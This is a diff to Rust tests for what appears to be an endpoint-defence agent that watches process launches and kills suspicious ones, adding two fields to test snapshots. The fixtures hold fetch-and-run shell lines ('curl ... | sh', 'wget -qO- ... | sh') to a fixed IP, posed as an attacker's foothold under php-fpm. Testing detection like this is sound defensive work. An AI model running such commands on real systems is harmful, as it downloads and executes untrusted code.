@@ -109,7 +109,7 @@ fn attacked(mode: Mode) -> (Watcher<Machine, Recorded>, String) {
     assert!(look(&mut watcher, T, &[]).is_empty());
     // The attacker's request makes a worker start a download-and-run shell.
     let shell = Proc { pid: 200, ppid: 101, name: "sh".into(), path: "/usr/bin/dash".into(), started: 9 };
-    let snap = Snap { proc: shell.clone(), cmdline: "sh -c curl -s http://93.184.216.34/p | sh".into(), parent: "php-fpm8.3".into() };
+    let snap = Snap { proc: shell.clone(), cmdline: "sh -c curl -s http://93.184.216.34/p | sh".into(), parent: "php-fpm8.3".into(), jumped: false, handed: false };
     watcher.sensor.procs.push(shell);
     watcher.sensor.lines.insert(200, snap.cmdline.clone());
     watcher.on_exec(&snap, T + 1.0);
@@ -175,8 +175,8 @@ fn the_agents_own_lookups_are_never_judged_and_the_same_command_from_anyone_else
     let mut watcher = Watcher::new(machine, Some(Recorded::default()), &"a".repeat(64), Mode::Kill, "c:\\windows\\");
     watcher.own.insert(500);
     watcher.myself = 500;
-    let mine = Snap { proc: lookup(700, 500), cmdline: line.into(), parent: "garrett.exe".into() };
-    let theirs = Snap { proc: lookup(800, 600), cmdline: line.into(), parent: "cmd.exe".into() };
+    let mine = Snap { proc: lookup(700, 500), cmdline: line.into(), parent: "garrett.exe".into(), jumped: false, handed: false };
+    let theirs = Snap { proc: lookup(800, 600), cmdline: line.into(), parent: "cmd.exe".into(), jumped: false, handed: false };
     watcher.on_exec(&mine, T);
     assert!(watcher.hands.as_ref().unwrap().killed.is_empty(), "the agent ended its own lookup");
     watcher.on_exec(&theirs, T);
@@ -256,7 +256,7 @@ fn a_fresh_install_leaves_a_merely_suspicious_program_for_its_owner_and_still_st
     watcher.keep_in(&settle, false);
     watcher.settle_in(24.0, true, T + 2.0);
     let shell = Proc { pid: 201, ppid: 101, name: "sh".into(), path: "/usr/bin/dash".into(), started: 11 };
-    let snap = Snap { proc: shell.clone(), cmdline: "sh -c wget -qO- http://93.184.216.34/q | sh".into(), parent: "php-fpm8.3".into() };
+    let snap = Snap { proc: shell.clone(), cmdline: "sh -c wget -qO- http://93.184.216.34/q | sh".into(), parent: "php-fpm8.3".into(), jumped: false, handed: false };
     watcher.sensor.procs.push(shell);
     watcher.on_exec(&snap, T + 3.0);
     assert_eq!(watcher.hands.as_ref().unwrap().killed, [200, 201]);
